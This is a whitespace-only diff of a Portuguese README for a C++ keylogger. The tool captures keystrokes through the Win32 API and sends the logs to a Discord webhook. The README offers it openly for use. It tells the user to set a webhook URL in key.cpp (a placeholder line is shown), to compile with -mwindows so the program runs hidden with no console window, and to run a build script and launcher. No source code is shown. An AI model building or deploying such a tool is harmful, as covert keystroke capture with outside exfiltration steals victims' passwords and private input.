@@ -15,11 +15,11 @@ O objetivo é capturar eventos de teclado e disparar os logs diretamente para um
 
 # 🛠️ Tecnologias e Dependências
   ```
-                                                  Linguagem: C++
-                                                    
-                                                  API Principal: Win32 API (Nativa do Windows)
-                                                    
-                                                  Envio de Dados: Discord Webhook API
+                                      Linguagem: C++
+                                                                                                                                      
+                                      API Principal: Win32 API (Nativa do Windows)
+                                                                                                                                      
+                                      Envio de Dados: Discord Webhook API
 ```
 
 # ⚙️ Configuração Inicial
@@ -27,13 +27,13 @@ O objetivo é capturar eventos de teclado e disparar os logs diretamente para um
 Antes de compilar, você precisa configurar a sua URL do Webhook do Discord diretamente no código-fonte.
 ```
                                                   
-                                                  Abra o arquivo key.cpp.
-                                                      
-                                                  Procure pela variável do Webhook (webHookDiscord).
-                                                      
-                                                  Substitua pelo seu link gerado no Discord:
-                                                  
-                                                  const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";
+                                    Abra o arquivo key.cpp.
+                                                                                          
+                                    Procure pela variável do Webhook (webHookDiscord).
+                                                                                          
+                                    Substitua pelo seu link gerado no Discord:
+                                                                                      
+                                    const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";
 
 ```
 
@@ -43,8 +43,8 @@ Antes de compilar, você precisa configurar a sua URL do Webhook do Discord dire
 # 🚀 Compilação e Uso
 
 ```    
-                                    Para buildar o projeto utilizando o g++ (MinGW), execute o comando abaixo no seu terminal. 
-                                    O parâmetro -mwindows garante que a aplicação rode em background sem abrir a janela do console.
+                            Para buildar o projeto utilizando o g++ (MinGW), execute o comando abaixo no seu terminal. 
+                            O parâmetro -mwindows garante que a aplicação rode em background sem abrir a janela do console.
 Bash
 ```
 
@@ -54,11 +54,11 @@ Bash
 
 # 🔧 Build em PowerShell
 ```
-                                                                  CMD or PowerShell
-                                                                      
-                                                                  .\build.ps1
-                                                                      
-                                                                  laucher.exe
+                                                CMD or PowerShell
+                                                                                                                      
+                                                .\build.ps1
+                                                                                                                      
+                                                laucher.exe
 ```
 
 ---
